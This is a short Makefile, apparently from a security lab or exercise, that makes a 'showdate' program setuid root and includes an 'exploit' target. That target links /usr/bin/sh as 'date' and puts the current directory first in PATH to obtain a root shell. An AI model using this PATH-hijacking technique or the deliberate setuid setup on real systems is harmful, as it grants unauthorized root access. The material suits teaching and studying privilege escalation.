all: set_permissions

exploit:
	ln -s /usr/bin/sh date
	PATH=.:$(PATH) ./showdate

clean:
	rm -f date

set_permissions: showdate
	sudo chown root:root ./$<
	sudo chmod u+s ./$<
